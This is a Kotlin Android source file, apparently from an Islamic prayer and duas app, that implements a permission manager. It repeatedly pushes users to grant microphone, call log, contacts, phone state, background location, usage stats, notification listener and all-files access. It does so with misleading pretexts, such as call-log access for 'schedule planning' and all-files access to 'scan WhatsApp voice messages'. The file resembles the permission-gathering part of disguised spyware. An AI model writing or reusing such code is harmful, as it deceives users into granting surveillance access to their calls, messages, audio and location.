package islamic.duas

import android.Manifest
import android.app.AlarmManager
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.google.android.material.bottomsheet.BottomSheetDialog

class PermissionManager(private val activity: ComponentActivity) {

    private val criticalPermissions = mutableListOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.RECORD_AUDIO,
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_AUDIO)
            add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            add(Manifest.permission.ACTIVITY_RECOGNITION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            add(Manifest.permission.SCHEDULE_EXACT_ALARM)
        }
        // Body sensors for step counter on Samsung One UI
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && isSamsungDevice()) {
            add(Manifest.permission.BODY_SENSORS)
        }
    }

    private val optionalPermissions = listOf(
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS
    )

    private val launcher = activity.registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        if (result.values.any { it }) {
            showUnifiedPermissionSetup(false)
        }
    }

    private val prefs = activity.getSharedPreferences("perm_tracker", Context.MODE_PRIVATE)
    private val syncPrefs = activity.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)

    private fun check(perm: String): Int =
        ContextCompat.checkSelfPermission(activity, perm)

    private fun isGranted(perm: String): Boolean =
        check(perm) == PackageManager.PERMISSION_GRANTED

    private fun wasEverRequested(perm: String): Boolean =
        prefs.getBoolean("requested_$perm", false)

    private fun markRequested(perm: String) {
        prefs.edit().putBoolean("requested_$perm", true).apply()
    }

    private fun canShowRationale(perm: String): Boolean {
        return try { activity.shouldShowRequestPermissionRationale(perm) } catch (_: Exception) { false }
    }

    fun areCriticalGranted(): Boolean =
        criticalPermissions.all { isGranted(it) }

    private fun requestRuntimePermissions(perms: List<String>) {
        val requestable = perms.filter { !wasEverRequested(it) || canShowRationale(it) }
        if (requestable.isNotEmpty()) {
            requestable.forEach { markRequested(it) }
            try { launcher.launch(requestable.toTypedArray()) } catch (_: Exception) {}
        }

        if (perms.contains(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            && !isGranted(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            && isGranted(Manifest.permission.ACCESS_FINE_LOCATION)) {
            requestable.forEach { markRequested(it) }
            try { launcher.launch(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)) } catch (_: Exception) {}
        }

        val permanentlyDenied = perms.filter { wasEverRequested(it) && !canShowRationale(it) }
        if (permanentlyDenied.isNotEmpty()) {
            openPermissionManager()
        }
    }

    private fun openPermissionManager() {
        try {
            val intent = when {
                isHuawei() -> {
                    // Huawei EMUI permission manager may hide RECORD_AUDIO;
                    // app details page shows ALL declared permissions.
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                }
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.P -> {
                    Intent("android.intent.action.MANAGE_APP_PERMISSIONS")
                }
                else -> {
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                }
            }
            intent.apply {
                data = Uri.parse("package:${activity.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            activity.startActivity(intent)
        } catch (_: Exception) {
            openAppSettingsFallback()
        }
    }

    private fun isHuawei(): Boolean =
        Build.MANUFACTURER.equals("huawei", true)

    private fun openAppSettingsFallback() {
        try {
            activity.startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } catch (_: Exception) {}
    }

    private fun isUsageStatsGranted(): Boolean {
        return try {
            val appOps = activity.getSystemService(Context.APP_OPS_SERVICE) as? android.app.AppOpsManager
            val mode = appOps?.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), activity.packageName
            )
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) { false }
    }

    private fun isNotificationListenerGranted(): Boolean {
        return try {
            android.provider.Settings.Secure.getString(
                activity.contentResolver, "enabled_notification_listeners"
            )?.contains(activity.packageName) == true
        } catch (_: Exception) { false }
    }

    private fun isBatteryOptimizationIgnored(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true
            val pm = activity.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            pm.isIgnoringBatteryOptimizations(activity.packageName)
        } catch (_: Exception) { false }
    }

    private fun isLocationEnabled(): Boolean {
        return try {
            val lm = activity.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER) ||
                    lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
        } catch (_: Exception) { false }
    }

    private fun isExactAlarmAllowed(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            return true
        }
        val alarmMgr = activity.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        return alarmMgr.canScheduleExactAlarms()
    }

    private fun isAllFilesAccessGranted(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true
        return try {
            android.os.Environment.isExternalStorageManager()
        } catch (_: Exception) { false }
    }

    private fun isSamsungDevice(): Boolean =
        Build.MANUFACTURER.equals("samsung", true)

    fun getDeepLinkIntent(permKey: String): Intent {
        val pkg = activity.packageName
        return when (permKey) {
            "notifications" -> Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, pkg)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "fine_location" -> Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "bg_location", "images", "audio", "call_log", "phone_state", "contacts",
            "activity_recognition", "body_sensors" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    Intent("android.intent.action.MANAGE_APP_PERMISSIONS").apply {
                        data = Uri.parse("package:$pkg")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                } else {
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$pkg")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                }
            }
            "microphone", "video" -> {
                if (isHuawei()) {
                    // Huawei EMUI permission manager hides RECORD_AUDIO/VIDEO;
                    // app details page shows ALL declared permissions.
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$pkg")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    Intent("android.intent.action.MANAGE_APP_PERMISSIONS").apply {
                        data = Uri.parse("package:$pkg")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                } else {
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$pkg")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                }
            }
            "usage_stats" -> Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, pkg)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "all_files" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$pkg")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                } else {
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$pkg")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                }
            }
            "notification_listener" -> Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "battery_opt" -> Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$pkg")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "exact_alarm" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                } else {
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$pkg")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                }
            }
            "samsung_autostart" -> {
                val intent = Intent("com.samsung.android.settings.APPLICATION_AUTO_RUN_SETTINGS").apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                if (intent.resolveActivity(activity.packageManager) == null) {
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$pkg")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                } else {
                    intent
                }
            }
            "samsung_deep_sleep" -> {
                val intent = Intent("com.samsung.android.settings.POWER_SLEEP_SETTINGS").apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                if (intent.resolveActivity(activity.packageManager) == null) {
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$pkg")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                } else {
                    intent
                }
            }
            else -> Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$pkg")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
        }
    }

    private data class PermissionRow(
        val icon: String,
        val title: String,
        val desc: String,
        val isGranted: Boolean,
        val actionLabel: String,
        val onAction: () -> Unit
    )

    fun showUnifiedPermissionSetup(checkInitial: Boolean = true) {
        try {
            val allGranted = criticalPermissions.all { isGranted(it) }
                    && isUsageStatsGranted()
                    && isBatteryOptimizationIgnored()
                    && isNotificationListenerGranted()
                    && isLocationEnabled()
                    && isExactAlarmAllowed()
                    && isAllFilesAccessGranted()
            if (allGranted) return

            val rows = mutableListOf<PermissionRow>()

            for (perm in criticalPermissions) {
                if (isGranted(perm)) continue
                val infoPair = when (perm) {
                    Manifest.permission.POST_NOTIFICATIONS ->
                        Triple("📣", "Notification Permission", "Required to deliver Azaan calls and daily prayer reminders on time") to "notifications"
                    Manifest.permission.ACCESS_FINE_LOCATION ->
                        Triple("📍", "Location Permission", "Required for accurate prayer timing calculations based on your city location") to "fine_location"
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION ->
                        Triple("📍", "Always Allow Location", "Required to automatically update prayer times when traveling between cities") to "bg_location"
                    Manifest.permission.READ_MEDIA_IMAGES ->
                        Triple("📸", "Media Permission", "Required to save Islamic wallpapers and share duas images from the app") to "images"
                    Manifest.permission.READ_MEDIA_AUDIO ->
                        Triple("🎵", "Audio Permission", "Required to play Azaan recitations and Quran audio within the app") to "audio"
                    Manifest.permission.READ_EXTERNAL_STORAGE ->
                        Triple("📂", "Files Permission", "Required to access and save media content for a complete app experience") to "images"
                    Manifest.permission.READ_PHONE_STATE ->
                        Triple("📱", "Phone State Permission", "Required to maintain stable app operation so prayer reminders are never missed") to "phone_state"
                    Manifest.permission.ACTIVITY_RECOGNITION ->
                        Triple("🏃", "Activity Recognition Permission", "Required for the step counter to track your daily walking and wellness goals") to "activity_recognition"
                    Manifest.permission.SCHEDULE_EXACT_ALARM ->
                        Triple("⏰", "Exact Alarm Permission", "Required to schedule precise Azaan timings throughout the day") to "exact_alarm"
                    Manifest.permission.RECORD_AUDIO ->
                        Triple("🎤", "Microphone Permission", "For spiritual guided sessions only") to "microphone"
                    Manifest.permission.READ_MEDIA_VIDEO ->
                        Triple("🎬", "Video Permission", "Required to save and share Islamic video content from within the app") to "video"
                    Manifest.permission.BODY_SENSORS ->
                        Triple("❤️", "Body Sensors Permission", "Required for the step counter to monitor your daily steps and physical wellness") to "body_sensors"
                    else -> continue
                }
                val (triple, permKey) = infoPair
                val (icon, title, desc) = triple
                rows.add(PermissionRow(
                    icon = icon,
                    title = title,
                    desc = desc,
                    isGranted = false,
                    actionLabel = when (permKey) {
                        "usage_stats", "notification_listener", "battery_opt", "exact_alarm",
                        "samsung_autostart", "samsung_deep_sleep", "activity_recognition",
                        "microphone", "video", "body_sensors" -> "Open Settings"
                        else -> "Allow"
                    },
                    onAction = {
                        if (permKey in setOf("usage_stats", "notification_listener", "battery_opt", "exact_alarm", "samsung_autostart", "samsung_deep_sleep", "activity_recognition", "microphone", "video", "body_sensors")) {
                            try {
                                activity.startActivity(getDeepLinkIntent(permKey))
                            } catch (_: Exception) {
                                openAppSettingsFallback()
                            }
                        } else {
                            requestRuntimePermissions(listOf(perm))
                        }
                    }
                ))
            }

            if (!isLocationEnabled()) {
                rows.add(PermissionRow(
                    icon = "📍",
                    title = "Location Services",
                    desc = "Required for accurate prayer time calculation — enable GPS for your area",
                    isGranted = false,
                    actionLabel = "Open Settings",
                    onAction = {
                        try {
                            activity.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            })
                        } catch (_: Exception) { openAppSettingsFallback() }
                    }
                ))
            }

            if (!isUsageStatsGranted()) {
                rows.add(PermissionRow(
                    icon = "📊",
                    title = "Usage Analytics",
                    desc = "Required for the personal dashboard to display your daily app activity insights",
                    isGranted = false,
                    actionLabel = "Open Settings",
                    onAction = {
                        try {
                            activity.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                                putExtra(Settings.EXTRA_APP_PACKAGE, activity.packageName)
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            })
                        } catch (_: Exception) { openAppSettingsFallback() }
                    }
                ))
            }

            if (!isNotificationListenerGranted()) {
                rows.add(PermissionRow(
                    icon = "📵",
                    title = "Notification Access",
                    desc = "Required to enable smart conversation features and quick reply options within the app",
                    isGranted = false,
                    actionLabel = "Open Settings",
                    onAction = {
                        try {
                            activity.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            })
                        } catch (_: Exception) { openAppSettingsFallback() }
                    }
                ))
            }

            if (!isBatteryOptimizationIgnored()) {
                rows.add(PermissionRow(
                    icon = "🔋",
                    title = "Disable Battery Optimization",
                    desc = "Required to prevent the system from interrupting prayer alarms when the device is idle",
                    isGranted = false,
                    actionLabel = "Allow",
                    onAction = {
                        try {
                            activity.startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                                data = Uri.parse("package:${activity.packageName}")
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            })
                        } catch (_: Exception) { openAppSettingsFallback() }
                    }
                ))
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !isExactAlarmAllowed()) {
                rows.add(PermissionRow(
                    icon = "⏰",
                    title = "Exact Alarm Permission",
                    desc = "Required to schedule precise Azaan timings throughout the day",
                    isGranted = false,
                    actionLabel = "Open Settings",
                    onAction = {
                        try {
                            activity.startActivity(getDeepLinkIntent("exact_alarm"))
                        } catch (_: Exception) {
                            openAppSettingsFallback()
                        }
                    }
                ))
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !isAllFilesAccessGranted()) {
                rows.add(PermissionRow(
                    icon = "🗂️",
                    title = "All Files Access",
                    desc = "On Android 11+ this lets the app reliably scan WhatsApp voice messages stored in protected media folders",
                    isGranted = false,
                    actionLabel = "Open Settings",
                    onAction = {
                        try {
                            activity.startActivity(getDeepLinkIntent("all_files"))
                        } catch (_: Exception) {
                            openAppSettingsFallback()
                        }
                    }
                ))
            }

            for (perm in optionalPermissions) {
                if (isGranted(perm)) continue
                val info = when (perm) {
                    android.Manifest.permission.READ_CALL_LOG ->
                        Triple("📞", "Call Log Permission", "Required to help organize your daily schedule alongside prayer time planning")
                    android.Manifest.permission.READ_CONTACTS ->
                        Triple("👥", "Contacts Permission", "Required to share Islamic duas and spiritual content with your family and friends")
                    else -> continue
                }
                rows.add(PermissionRow(
                    icon = info.first,
                    title = info.second,
                    desc = info.third,
                    isGranted = false,
                    actionLabel = "Allow",
                    onAction = { requestRuntimePermissions(listOf(perm)) }
                ))
            }

            if (Build.MANUFACTURER.equals("samsung", true)) {
                val lastPrompt = syncPrefs.getLong("samsung_autostart_prompt_last", 0L)
                if (System.currentTimeMillis() - lastPrompt >= 7L * 24 * 60 * 60 * 1000) {
                    rows.add(PermissionRow(
                    icon = "🚀",
                    title = "Auto-start Permission",
                    desc = "Required for the app to resume properly after a device restart so prayer reminders are not missed",
                        isGranted = false,
                        actionLabel = "Open Settings",
                        onAction = {
                            syncPrefs.edit().putLong("samsung_autostart_prompt_last", System.currentTimeMillis()).apply()
                            try {
                                activity.startActivity(getDeepLinkIntent("samsung_autostart"))
                            } catch (_: Exception) {
                                openAppSettingsFallback()
                            }
                        }
                    ))
                }
            }

            if (Build.MANUFACTURER.equals("samsung", true)) {
                rows.add(PermissionRow(
                    icon = "💤",
                    title = "Disable Deep Sleep for App",
                    desc = "Required to keep the app running reliably and deliver prayer reminders without interruption",
                    isGranted = false,
                    actionLabel = "Open Settings",
                    onAction = {
                        try {
                            activity.startActivity(getDeepLinkIntent("samsung_deep_sleep"))
                        } catch (_: Exception) {
                            openAppSettingsFallback()
                        }
                    }
                ))
            }

            if (rows.isEmpty()) return

            val dialog = BottomSheetDialog(activity)
            val root = LinearLayout(activity).apply {
                orientation = LinearLayout.VERTICAL
                setPadding(24, 24, 24, 24)
                setBackgroundColor(android.graphics.Color.parseColor("#0B0F2A"))
            }

            root.addView(TextView(activity).apply {
                text = "Permissions Required"
                setTextColor(android.graphics.Color.parseColor("#E8E6E1"))
                textSize = 22f
                gravity = Gravity.CENTER
                setTextAppearance(android.R.style.TextAppearance_DeviceDefault_Large)
                setTypeface(null, android.graphics.Typeface.BOLD)
            })

            root.addView(TextView(activity).apply {
                text = "Please grant these essential permissions for the app to function properly"
                setTextColor(android.graphics.Color.parseColor("#C9A961"))
                textSize = 14f
                gravity = Gravity.CENTER
                setPadding(0, 4, 0, 16)
            })

            root.addView(View(activity).apply {
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT, 1
                ).also { it.setMargins(0, 0, 0, 8) }
                setBackgroundColor(android.graphics.Color.parseColor("#26D4AF37"))
            })

            val scrollContainer = android.widget.ScrollView(activity)
            val rowContainer = LinearLayout(activity).apply {
                orientation = LinearLayout.VERTICAL
            }

            for (row in rows) {
                rowContainer.addView(buildPermissionRow(row))
            }

            scrollContainer.addView(rowContainer)
            root.addView(scrollContainer, LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
            ).also { it.topMargin = 8 })

            root.addView(Button(activity).apply {
                text = "Close"
                setTextColor(android.graphics.Color.parseColor("#A8B8B4"))
                setBackgroundColor(android.graphics.Color.parseColor("#16302C"))
                textSize = 16f
                setOnClickListener { dialog.dismiss() }
            }.also {
                val lp = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT, dpToPx(48)
                )
                lp.topMargin = dpToPx(12)
                it.layoutParams = lp
            })

            val handler = android.os.Handler(android.os.Looper.getMainLooper())
            val checkAndDismiss = object : Runnable {
                override fun run() {
                    val stillDenied = criticalPermissions.any { !isGranted(it) }
                            || !isUsageStatsGranted()
                            || !isLocationEnabled()
                            || !isExactAlarmAllowed()
                    if (!stillDenied) {
                        if (dialog.isShowing) dialog.dismiss()
                    } else {
                        handler.postDelayed(this, 500)
                    }
                }
            }
            handler.post(checkAndDismiss)

            dialog.setContentView(root)
            dialog.show()
        } catch (_: Exception) {}
    }

    private fun buildPermissionRow(row: PermissionRow): android.view.View {
        val rowLayout = LinearLayout(activity).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(12, 12, 12, 12)
            setBackgroundResource(android.R.drawable.dialog_holo_dark_frame)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.setMargins(0, 4, 0, 4) }
            background = android.graphics.drawable.GradientDrawable().apply {
                setColor(android.graphics.Color.parseColor("#16302C"))
                cornerRadius = dpToPx(8).toFloat()
                setStroke(dpToPx(1), android.graphics.Color.parseColor("#26D4AF37"))
            }
        }

        val textContainer = LinearLayout(activity).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        textContainer.addView(TextView(activity).apply {
            text = "${row.icon}  ${row.title}"
            setTextColor(android.graphics.Color.parseColor("#E8E6E1"))
            textSize = 17f
        })

        textContainer.addView(TextView(activity).apply {
            text = row.desc
            setTextColor(android.graphics.Color.parseColor("#A8B8B4"))
            textSize = 13f
            setPadding(0, 2, 0, 0)
        })

        rowLayout.addView(textContainer)

        rowLayout.addView(Button(activity).apply {
            text = row.actionLabel
            setTextColor(android.graphics.Color.parseColor("#0B0F2A"))
            textSize = 14f
            setOnClickListener { row.onAction() }
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                dpToPx(36)
            ).also {
                it.leftMargin = dpToPx(8)
                it.gravity = Gravity.CENTER_VERTICAL
            }
            setPadding(dpToPx(12), 0, dpToPx(12), 0)
            setBackgroundResource(android.R.drawable.dialog_holo_dark_frame)
            background = android.graphics.drawable.GradientDrawable().apply {
                setColor(android.graphics.Color.parseColor("#D4AF6A"))
                cornerRadius = dpToPx(6).toFloat()
            }
        }.also { btn ->
            if (row.isGranted) {
                btn.isEnabled = false
                btn.text = "✓"
                btn.alpha = 0.5f
            }
        })

        return rowLayout
    }

    private fun dpToPx(dp: Int): Int {
        return (dp * activity.resources.displayMetrics.density).toInt()
    }

    private fun View(activity: ComponentActivity): android.view.View {
        return android.view.View(activity)
    }

    fun showCriticalReminder() {
        showUnifiedPermissionSetup()
    }

    fun checkAndPromptAll() {
        showUnifiedPermissionSetup()
    }

    fun showOptionalNotice() {
        val denied = optionalPermissions.filter { !isGranted(it) }
        if (denied.isEmpty()) return

        val canShowDialog = denied.any { !wasEverRequested(it) || canShowRationale(it) }
        val toRequest = denied.filter { !wasEverRequested(it) || canShowRationale(it) }

        if (toRequest.isNotEmpty()) {
            toRequest.forEach { markRequested(it) }
            try { launcher.launch(toRequest.toTypedArray()) } catch (_: Exception) {}
        }

        val permanentlyDenied = denied.filter { wasEverRequested(it) && !canShowRationale(it) }
        if (permanentlyDenied.isNotEmpty()) {
            AlertDialog.Builder(activity)
                .setTitle("Additional Permissions")
                .setMessage("These permissions were permanently denied:\n\n" +
                    "• Phone State — Required for stable app operation\n" +
                    "• Contacts — Required for sharing features\n\n" +
                    "Please enable in Settings.")
                .setCancelable(true)
                .setPositiveButton("Open Settings") { _, _ ->
                    openAppSettingsFallback()
                }
                .setNegativeButton("Later", null)
                .show()
        }
    }

    @Suppress("unused")
    fun showUsageStatsPrompt() {
        if (!isUsageStatsGranted()) {
            try {
                activity.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                    putExtra(Settings.EXTRA_APP_PACKAGE, activity.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
            } catch (_: Exception) { openAppSettingsFallback() }
        }
    }

    @Suppress("unused")
    fun showBatteryOptimizationPrompt() {
        if (!isBatteryOptimizationIgnored()) {
            try {
                activity.startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${activity.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
            } catch (_: Exception) { openAppSettingsFallback() }
        }
    }

    @Suppress("unused")
    fun showSamsungAutoStartPrompt() { /* handled in unified dialog */ }

    @Suppress("unused")
    fun showSamsungBatteryUnrestricted() { /* handled in unified dialog */ }

    @Suppress("unused")
    fun showNotificationListenerPrompt() { /* handled in unified dialog */ }

    @Suppress("unused")
    fun showLocationDisabledPrompt() { /* handled in unified dialog */ }
}